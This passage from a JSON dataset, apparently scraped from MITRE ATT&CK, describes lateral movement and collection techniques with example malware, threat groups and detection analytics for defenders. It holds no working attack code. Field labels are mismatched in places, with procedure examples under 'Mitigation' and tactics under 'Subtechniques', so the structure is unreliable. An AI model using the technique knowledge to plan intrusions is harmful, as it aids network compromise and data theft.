      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for user accounts logged into systems they would not normally access or abnormal access patterns, such as multiple systems over a relatively short period of time. Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement. For example, in macOS you can review logs for \"screensharingd\" and \"Authentication\" event messages. [7][13]Note: When using Security event id 4624, %$ means user names that do not end with $ character. Usually, computer accounts or local system accounts names end with the $ character. When using Security event 4624, UserName and UserLogonId correspond to TargetUserName and TargetLogonId respectively. When using Security event 4624, LogonType 3 corresponds to a Network Logon Analytic 1 - New services being created under network logon sessions by non-system users remote_logon_sessions = filter Hostname, UserName, UserLogonId, SourceIp where  event_id == \"4624\" AND  LogonType == \"3\" AND  UserName NOT LIKE '%$' new_services = filter UserName, UserLogonId, ServiceName where event_id = \"4697\"suspicious_services = filter l.UserName, l.UserLogonId, l.SourceIp, s.ServicenameFROM remote_logon_sessions lINNER JOIN new_services sON l.UserLogonId = s.UserLogonId"
      },
      {
        "id": "DS0011",
        "dsource": "Module",
        "dcomp": "Module Load",
        "detects": "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes, that may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.Note: On Windows, Sysmon Event ID 7 (Image loaded) can be used to monitor the loading of DLLs into processes, including those designed to accept remote connections. This is a particularly noisy event and can generate a large volume of data, so we recommend baselining and filtering out any known benign processes and module to help reduce the number of events that are produced."
      },
      {
        "id": "DS0033",
        "dsource": "Network Share",
        "dcomp": "Network Share Access",
        "detects": "Monitor interactions with network shares, such as reads or file transfers, using remote services such as Server Message Block (SMB)."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections that may use Valid Accounts to log into a service specifically designed to accept remote connections, such as RDP, telnet, SSH, and VNC. Monitor network connections involving common remote management protocols, such as ports tcp:3283 and tcp:5900, as well as ports tcp: 3389 and tcp:22 for remote login.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network service protocols such as SSH and RDP.Analytic 1 - Suspicious Protocolssuspicious_protocol = filter network_traffic where ((server_port = \"636\" AND protocol = \"6\") OR (server_port = \"389\" AND protocol = \"17\"))"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor network data for uncommon data flows that may be related to abuse of Valid Accounts to log into a service specifically designed to accept remote connections, such as RDP, telnet, SSH, and VNC."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may use Valid Accounts to log into a service specifically designed to accept remote connections, such as RDP, telnet, SSH, and VNC. The adversary may then perform actions that spawn additional processes as the logged-on user."
      },
      {
        "id": "DS0005",
        "dsource": "WMI",
        "dcomp": "WMI Creation",
        "detects": "Monitor for newly constructed WMI objects that is often used to log into a service that accepts remote connects."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1021.001",
        "name": "Remote Desktop Protocol"
      },
      {
        "id": "T1021.002",
        "name": "SMB/Windows Admin Shares"
      },
      {
        "id": "T1021.003",
        "name": "Distributed Component Object Model"
      },
      {
        "id": "T1021.004",
        "name": "SSH"
      },
      {
        "id": "T1021.005",
        "name": "VNC"
      },
      {
        "id": "T1021.006",
        "name": "Windows Remote Management"
      },
      {
        "id": "T1021.007",
        "name": "Cloud Services"
      },
      {
        "id": "T1021.008",
        "name": "Direct Cloud VM Connections"
      }
    ],
    "Tactic": "\nLateral Movement"
  },
  {
    "Title": "Replication Through Removable Media",
    "Code": "T1091",
    "Description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.[1] This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.[2][3] For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
    "Mitigation": [
      {
        "id": "S0092",
        "name": "Agent.btz",
        "description": "Agent.btz drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.[4]"
      },
      {
        "id": "S1074",
        "name": "ANDROMEDA",
        "description": "ANDROMEDA has been spread via infected USB keys.[5]"
      },
      {
        "id": "G1007",
        "name": "Aoqin Dragon",
        "description": "Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.[6]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[7]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "Part of APT28's operation involved using CHOPSTICK modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.[8][7][9]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker variants used the Windows AUTORUN feature to spread through USB propagation.[10][11]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can spread across systems by infecting removable media.[12]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.[13]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky searches for removable media and duplicates itself onto it.[14]"
      },
      {
        "id": "G0046",
        "name": "FIN7",
        "description": "FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations.[15]"
      },
      {
        "id": "S0143",
        "name": "Flame",
        "description": "Flame contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.[16]"
      },
      {
        "id": "S0132",
        "name": "H1N1",
        "description": "H1N1 has functionality to copy itself to removable media.[17]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has used malicious DLLs to spread malware to connected removable USB drives on infected machines.[18][19]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has used a customized PlugX variant which could spread through USB connections.[20]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can be configured to spread via removable drives.[21][22]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has the ability to use removable drives to spread through compromised networks.[23]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can spread itself by infecting other portable executable files on removable drives.[24]"
      },
      {
        "id": "S0028",
        "name": "SHIPSHAPE",
        "description": "APT30 may have used the SHIPSHAPE malware to move onto air-gapped networks. SHIPSHAPE targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.[25]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.[26]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine.[27]"
      },
      {
        "id": "S0130",
        "name": "Unknown Logger",
        "description": "Unknown Logger is capable of spreading to USB devices.[28]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has copied itself to and infected removable drives for propagation.[29][30]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can copy its installer to attached USB storage devices.[27]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "USBStealer drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.[31]"
      }
    ],
    "Detection": [
      {
        "id": "DS0016",
        "dsource": "Drive",
        "dcomp": "Drive Creation",
        "detects": "Monitor for newly constructed drive letters or mount points to removable media"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected files accessed on removable media."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files on removable media"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery."
      }
    ],
    "Subtechniques": "LateralMovement, InitialAccess"
  },
  {
    "Title": "Software Deployment Tools",
    "Code": "T1072",
    "Description": "Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, HBSS, Altiris, etc.).  Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints. Network infrastructure may also have administration tools that can be similarly abused by adversaries. [1]The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",
    "Mitigation": [
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 compromised McAfee ePO to move laterally by distributing malware as a software deployment task.[2]"
      },
      {
        "id": "C0018",
        "name": "C0018",
        "description": "During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network.[3]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used the commercially available tool RemoteExec for agentless remote code execution.[4]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used RAdmin, a remote software tool used to remotely control workstations and ATMs.[5]"
      },
      {
        "id": "G0028",
        "name": "Threat Group-1314",
        "description": "Threat Group-1314 actors used a victim's endpoint management platform, Altiris, for lateral movement.[6]"
      },
      {
        "id": "S0041",
        "name": "Wiper",
        "description": "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the Wiper malware.[7]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Often these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Ensure that third-party application logs are on-boarded to the enterprise logging system and the logs are regularly reviewed. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious. Monitor account login activity on these applications to detect suspicious/abnormal usage.Perform application deployment at regular times so that irregular deployment activity stands out."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that does not correlate to known good software. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems."
      }
    ],
    "Subtechniques": "Execution, LateralMovement"
  },
  {
    "Title": "Taint Shared Content",
    "Code": "T1080",
    "Description": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. [1]Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
    "Mitigation": [
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has placed malware on file shares and given it the same name as legitimate documents on the share.[2]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can spread itself by infecting other remote machines via network shared drives.[3][4]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel used a virus that propagates by infecting executables stored on shared drives.[5]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.[6]"
      },
      {
        "id": "S0132",
        "name": "H1N1",
        "description": "H1N1 has functionality to copy itself to network shares.[7]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network.[8]"
      },
      {
        "id": "S0133",
        "name": "Miner-C",
        "description": "Miner-C copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.[9]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can spread itself by infecting other portable executable files on networks shared drives.[10]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet infects remote servers via network shares and by infecting WinCC database views with malicious code.[11]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has copied itself to and infected files in network drives for propagation.[12][13]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor for newly constructed files from files that write or overwrite many files to a network shared directory may be suspicious."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "File Modification",
        "detects": "Monitor for files that write or overwrite many files to a network shared directory may be suspicious."
      },
      {
        "id": "DS0033",
        "dsource": "Network Share",
        "dcomp": "Network Share Access",
        "detects": "Monitor for unexpected and abnormal accesses to network shares, especially those also associated with file activity."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques."
      }
    ],
    "Subtechniques": "\nLateral Movement"
  },
  {
    "Title": "Use Alternate Authentication Material",
    "Code": "T1550",
    "Description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.[1][2]Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
    "Mitigation": [
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb can allow abuse of a compromised AD FS server's SAML token.[3]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used forged SAML tokens that allowed the actors to impersonate users and bypass MFA, enabling APT29 to access enterprise cloud applications and services.[4][5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Credential Request",
        "detects": "Monitor requests of new ticket granting ticket or service tickets to a Domain Controller, such as Windows EID 4769 or 4768, that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      },
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor for third-party application logging, messaging, and/or other artifacts that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      },
      {
        "id": "DS0006",
        "dsource": "Web Credential",
        "dcomp": "Web Credential Usage",
        "detects": "Monitor for an attempt by a user to gain access to a network or computing resource by providing web credentials (ex: Windows EID 1202) that may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1550.001",
        "name": "Application Access Token"
      },
      {
        "id": "T1550.002",
        "name": "Pass the Hash"
      },
      {
        "id": "T1550.003",
        "name": "Pass the Ticket"
      },
      {
        "id": "T1550.004",
        "name": "Web Session Cookie"
      }
    ],
    "Tactic": "DefenseEvasion, LateralMovement"
  },
  {
    "Title": "Adversary-in-the-Middle",
    "Code": "T1557",
    "Description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.[1]For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.[2][3][4] Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.[5] Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.[6][7][8]Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.",
    "Mitigation": [
      {
        "id": "S0281",
        "name": "Dok",
        "description": "Dok proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.[9][10]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.[11]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor application logs for changes to settings and other events associated with network protocols and other services commonly abused for AiTM.[12]"
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor network traffic for anomalies associated with known AiTM behavior."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Network Traffic Flow",
        "detects": "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware."
      },
      {
        "id": "DS0019",
        "dsource": "Service",
        "dcomp": "Service Creation",
        "detects": "Monitor for newly constructed services/daemons through Windows event logs for event IDs 4697 and 7045. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as remote logins or process creation events."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Modification",
        "detects": "Monitor HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient for changes to the \"EnableMulticast\" DWORD value. A value of \"0\" indicates LLMNR is disabled."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1557.001",
        "name": "LLMNR/NBT-NS Poisoning and SMB Relay"
      },
      {
        "id": "T1557.002",
        "name": "ARP Cache Poisoning"
      },
      {
        "id": "T1557.003",
        "name": "DHCP Spoofing"
      }
    ],
    "Tactic": "CredentialAccess, Collection"
  },
  {
    "Title": "Archive Collected Data",
    "Code": "T1560",
    "Description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
    "Mitigation": [
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.[1]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can encrypt data with 3DES before sending it over to a C2 server.[2]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed has compressed collected data before exfiltration.[3]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[4]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32's backdoor has used LZMA compression and RC4 encryption before exfiltration.[5]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has used ZIP to compress data gathered on a compromised host.[6]"
      },
      {
        "id": "G0001",
        "name": "Axiom",
        "description": "Axiom has compressed and encrypted data prior to exfiltration.[7]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.[8]"
      },
      {
        "id": "S0521",
        "name": "BloodHound",
        "description": "BloodHound can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.[9][10]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can zip files before exfiltration.[11]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can compress data stolen from the Registry and volume shadow copies prior to exfiltration.[12]"
      },
      {
        "id": "S0454",
        "name": "Cadelspy",
        "description": "Cadelspy has the ability to compress stolen data into a .cab file.[13]"
      },
      {
        "id": "S0667",
        "name": "Chrommme",
        "description": "Chrommme can encrypt and store on disk collected data before exfiltration.[14]"
      },
      {
        "id": "S0187",
        "name": "Daserf",
        "description": "Daserf hides collected data in password-protected .rar archives.[15]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has compressed data into .zip files prior to exfiltration.[16]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack packs collected data into a password protected archive.[17]"
      },
      {
        "id": "S0367",
        "name": "Emotet",
        "description": "Emotet has been observed encrypting the data it collects before sending it to the C2 server. [18]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire can ZIP directories on the target system.[19]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic encrypts collected data using a public key framework before sending it over the C2 channel.[20] Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.[21]"
      },
      {
        "id": "S0343",
        "name": "Exaramel for Windows",
        "description": "Exaramel for Windows automatically encrypts files before sending them to the C2 server.[22]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT encrypts collected data with AES and Base64 and then sends it to the C2 server.[23]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration.[24]"
      },
      {
        "id": "S0249",
        "name": "Gold Dragon",
        "description": "Gold Dragon encrypts data using Base64 before being sent to the command and control server.[25]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "The Ke3chang group has been known to compress data before exfiltration.[26]"
      },
      {
        "id": "S0487",
        "name": "Kessel",
        "description": "Kessel can RC4-encrypt credentials before sending to the C2.[27]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has encrypted data and files prior to exfiltration.[28]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format, encrypt the .zip file, and upload it to C2. [29][30][31]"
      },
      {
        "id": "G0065",
        "name": "Leviathan",
        "description": "Leviathan has archived victim's data prior to exfiltration.[32]"
      },
      {
        "id": "S0395",
        "name": "LightNeuron",
        "description": "LightNeuron contains a function to encrypt and store emails that it collects.[33]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar has encrypted data before sending it to the server.[34]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has manually archived stolen files from victim machines before exfiltration.[35]"
      },
      {
        "id": "S0010",
        "name": "Lurid",
        "description": "Lurid can compress data before sending it.[36]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete stores zipped files with profile data from installed web browsers.[37]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has encrypted files and information before exfiltration.[38][39]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE has the ability to compress archived screenshots.[40]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "Patchwork encrypted the collected files' path with AES and then encoded them with base64.[41]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint has encrypted stolen credit card information with AES and further encoded it with Base64.[42]"
      },
      {
        "id": "S1012",
        "name": "PowerLess",
        "description": "PowerLess can encrypt browser database files prior to exfiltration.[43]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "After collecting documents from removable media, Prikormka compresses the collected files, and encrypts it with Blowfish.[44]"
      },
      {
        "id": "S0279",
        "name": "Proton",
        "description": "Proton zips up files before exfiltrating them.[45]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi encrypts and adds all gathered browser data into files for upload to C2.[46]"
      },
      {
        "id": "S0253",
        "name": "RunningRAT",
        "description": "RunningRAT contains code to compress files.[25]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter used LZ compression to compress initial reconnaissance reports before sending to the C2.[47]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "TAINTEDSCRIBE has used FileReadZipSend to compress a file and send to C2.[48]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN encrypts the collected files using 3-DES.[49]"
      },
      {
        "id": "S0515",
        "name": "WellMail",
        "description": "WellMail can archive files on the compromised host.[50]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET will compress entire ~/Desktop folders excluding all .git folders, but only if the total data size is under 200MB.[51]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy  has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration. [52][53][54]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that will aid in compression or encrypting data that is collected prior to exfiltration, such as tar."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Creation",
        "detects": "Monitor newly constructed files being written with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly constructed processes and/or command-lines that aid in compression or encrypting data that is collected prior to exfiltration, such as 7-Zip, WinRAR, and WinZip."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1560.001",
        "name": "Archive via Utility"
      },
      {
        "id": "T1560.002",
        "name": "Archive via Library"
      },
      {
        "id": "T1560.003",
        "name": "Archive via Custom Method"
      }
    ],
    "Tactic": "\nCollection"
  },
  {
    "Title": "Audio Capture",
    "Code": "T1123",
    "Description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
    "Mitigation": [
      {
        "id": "G0067",
        "name": "APT37",
        "description": "APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input.[1]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor's has a plugin that is capable of recording audio using available input sound devices.[2]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook has modules that are capable of capturing audio.[3]"
      },
      {
        "id": "S0454",
        "name": "Cadelspy",
        "description": "Cadelspy has the ability to record audio from the compromised host.[4]"
      },
      {
        "id": "S0338",
        "name": "Cobian RAT",
        "description": "Cobian RAT has a feature to perform voice recording on the victim’s machine.[5]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can perform audio surveillance using microphones.[6]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet can listen in to victims' conversations through the system’s microphone.[7][8]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi is capable of performing audio captures.[9]"
      },
      {
        "id": "S0213",
        "name": "DOGCALL",
